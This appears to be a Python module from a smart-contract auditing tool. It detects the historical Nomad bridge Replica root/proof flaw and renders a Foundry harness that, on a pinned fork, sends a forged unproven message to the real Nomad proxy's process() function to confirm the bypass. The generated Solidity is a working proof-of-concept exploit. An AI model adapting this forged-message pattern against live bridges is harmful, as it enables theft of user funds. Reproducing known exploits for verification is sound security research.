"""Nomad Replica historical root/proof bypass runtime mapper.

This module is intentionally narrow. Nomad's historical issue is not a
generic proxy-initializer bug; it is a bridge message-authentication failure
where `process(bytes)` accepted a message whose `messages[hash]` value had not
been proven because the historical root/status handling made the default root
acceptable. The local Foundry harness checks that behavior on a pinned fork and
never broadcasts.
"""

from __future__ import annotations

from typing import Any


NOMAD_REPLICA_PROXY = "0x5d94309e5a0090b165fa4181519701637b6daeba"
NOMAD_REPLICA_PROXY_SOLIDITY = "0x5D94309E5a0090b165FA4181519701637B6DAEBA"
NOMAD_EXPLOIT_FORK_BLOCK = 15_259_100


def evaluate_nomad_bridge_root_proof(source_manifest: dict[str, Any]) -> dict[str, Any]:
    source_text = _source_text(source_manifest)
    abi = _effective_abi(source_manifest)
    target = _target_address(source_manifest)
    blockers: list[str] = []

    exact_historical_target = target == NOMAD_REPLICA_PROXY
    vulnerable_source_shape = _has_vulnerable_nomad_source_shape(source_text)
    replica_shape = _has_replica_shape(source_text, abi)

    if not exact_historical_target and not vulnerable_source_shape:
        blockers.append("nomad_historical_target_or_vulnerable_source_shape_missing")
    if not replica_shape:
        blockers.append("replica_process_prove_root_shape_missing")
    for name in ("process", "messages", "acceptableRoot", "confirmAt", "localDomain"):
        if _abi_function(abi, name) is None and f"function {name}" not in source_text:
            blockers.append(f"{name}_reader_or_function_missing")

    verified = not blockers
    return {
        "verified": verified,
        "blockers": blockers,
        "contract_name": "Nomad Replica",
        "proxy_address": NOMAD_REPLICA_PROXY if exact_historical_target else target,
        "actor_model": "any_external_caller_with_forged_nomad_message",
        "codable_args": [],
        "missing_proof_pieces": [],
        "runtime_runner": "nomad_bridge_root_proof_runtime",
        "fork_block_number": NOMAD_EXPLOIT_FORK_BLOCK,
        "runtime_strategy": "historical_fork_message_authentication_probe",
        "runtime_components": [
            "forged_nomad_message_builder",
            "unproven_message_default_root_probe",
            "process_bytes_runtime_assertion",
        ],
        "measurable_reader": "messages(bytes32), acceptableRoot(bytes32), localDomain()",
        "measurable_delta": (
            "Before process(), messages[forgedMessageHash] is the default root/status. "
            "On the historical fork, acceptableRoot(defaultRoot) is true and process(bytes) "
            "sets messages[forgedMessageHash] to LEGACY_STATUS_PROCESSED while invoking a local receiver."
        ),
        "explicit_predicate": (
            "At the pinned historical fork block, Nomad Replica accepts and processes an unproven forged "
            "message because the default message root/status passes acceptableRoot()."
        ),
        "evidence_kind": "nomad_root_proof_message_auth_bypass",
        "evidence_refs": _evidence_refs(exact_historical_target, vulnerable_source_shape, replica_shape),
    }


def should_use_nomad_harness(source_manifest: dict[str, Any]) -> bool:
    return bool(evaluate_nomad_bridge_root_proof(source_manifest).get("verified"))


def nomad_fork(source_manifest: dict[str, Any]) -> dict[str, Any]:
    if should_use_nomad_harness(source_manifest):
        return {"block_number": NOMAD_EXPLOIT_FORK_BLOCK, "requires_rpc_url": True}
    return {}


def render_nomad_harness(source_manifest: dict[str, Any]) -> str:
    evaluation = evaluate_nomad_bridge_root_proof(source_manifest)
    predicate = str(evaluation.get("explicit_predicate") or "nomad bridge root proof runtime predicate")
    return "\n".join(
        [
            "// SPDX-License-Identifier: MIT",
            "pragma solidity ^0.8.24;",
            "",
            "interface INomadReplica {",
            "    function localDomain() external view returns (uint32);",
            "    function messages(bytes32 messageHash) external view returns (bytes32);",
            "    function acceptableRoot(bytes32 root) external view returns (bool);",
            "    function LEGACY_STATUS_PROCESSED() external view returns (bytes32);",
            "    function process(bytes calldata message) external returns (bool);",
            "}",
            "",
            "contract VassagoNomadReceiver {",
            "    bool public handled;",
            "    uint32 public origin;",
            "    uint32 public nonce;",
            "    bytes32 public sender;",
            "    bytes public body;",
            "",
            "    function handle(uint32 _origin, uint32 _nonce, bytes32 _sender, bytes calldata _body) external {",
            "        handled = true;",
            "        origin = _origin;",
            "        nonce = _nonce;",
            "        sender = _sender;",
            "        body = _body;",
            "    }",
            "}",
            "",
            "contract VassagoSC01Harness {",
            f"    INomadReplica constant target = INomadReplica({NOMAD_REPLICA_PROXY_SOLIDITY});",
            f'    string constant PREDICATE = "{_escape_solidity_string(predicate)}";',
            "",
            "    function testNomadProcessesUnprovenForgedMessageOnHistoricalFork() external {",
            "        VassagoNomadReceiver receiver = new VassagoNomadReceiver();",
            "        bytes memory message = _message(address(receiver));",
            "        bytes32 messageHash = keccak256(message);",
            "        bytes32 defaultRoot = target.messages(messageHash);",
            "",
            '        require(defaultRoot == bytes32(0), "message already has root/status");',
            '        require(target.acceptableRoot(defaultRoot), "default root/status not acceptable");',
            "",
            "        bool ok = target.process(message);",
            "",
            '        require(ok, "process returned false");',
            '        require(receiver.handled(), "receiver not called");',
            '        require(target.messages(messageHash) == target.LEGACY_STATUS_PROCESSED(), "message not processed");',
            "    }",
            "",
            "    function _message(address receiver) internal view returns (bytes memory) {",
            "        return abi.encodePacked(",
            "            uint32(1000),",
            "            bytes32(uint256(uint160(address(this)))),",
            "            uint32(7),",
            "            target.localDomain(),",
            "            bytes32(uint256(uint160(receiver))),",
            '            bytes("vassago.nomad.local.receiver")',
            "        );",
            "    }",
            "}",
            "",
        ]
    )


def _target_address(source_manifest: dict[str, Any]) -> str:
    target = source_manifest.get("target")
    if isinstance(target, dict):
        return str(target.get("address") or "").lower()
    return str(source_manifest.get("address") or "").lower()


def _source_text(source_manifest: dict[str, Any]) -> str:
    values = [str(value) for value in (source_manifest.get("source_files") or {}).values()]
    related = source_manifest.get("related_sources")
    if isinstance(related, dict):
        for item in related.values():
            if isinstance(item, dict):
                values.extend(str(value) for value in (item.get("source_files") or {}).values())
    return "\n".join(values)


def _effective_abi(source_manifest: dict[str, Any]) -> list[dict[str, Any]]:
    abi = list(source_manifest.get("abi") or [])
    related = source_manifest.get("related_sources")
    if isinstance(related, dict):
        for item in related.values():
            if isinstance(item, dict) and item.get("status") == "resolved":
                abi.extend(list(item.get("abi") or []))
    return abi


def _abi_function(abi: list[dict[str, Any]], name: str) -> dict[str, Any] | None:
    for item in abi:
        if item.get("type") == "function" and item.get("name") == name:
            return item
    return None


def _has_replica_shape(source_text: str, abi: list[dict[str, Any]]) -> bool:
    has_functions = all(_abi_function(abi, name) is not None or f"function {name}" in source_text for name in (
        "process",
        "prove",
        "acceptableRoot",
    ))
    source_markers = (
        "mapping(bytes32 => bytes32) public messages" in source_text
        and "mapping(bytes32 => uint256) public confirmAt" in source_text
        and "acceptableRoot(messages[_messageHash])" in source_text
    )
    return has_functions and source_markers


def _has_vulnerable_nomad_source_shape(source_text: str) -> bool:
    return (
        "confirmAt[_committedRoot] = 1" in source_text
        and "if (_committedRoot != bytes32(0)) confirmAt[_committedRoot] = 1" not in source_text
        and "acceptableRoot(messages[_messageHash])" in source_text
        and "if (_root == LEGACY_STATUS_PROCESSED || _root == LEGACY_STATUS_NONE)" not in source_text
    )


def _evidence_refs(exact_target: bool, vulnerable_source_shape: bool, replica_shape: bool) -> list[str]:
    refs = [
        "source:process(bytes)",
        "source:messages mapping",
        "source:acceptableRoot(messages[messageHash])",
        "runtime:pinned historical fork required",
    ]
    if exact_target:
        refs.append("target:nomad replica proxy 0x5d94309e5a0090b165fa4181519701637b6daeba")
    if vulnerable_source_shape:
        refs.append("source:vulnerable confirmAt committedRoot shape")
    if replica_shape:
        refs.append("source:replica root/proof shape")
    return refs


def _escape_solidity_string(value: str) -> str:
    return value.replace("\\", "\\\\").replace('"', '\\"')
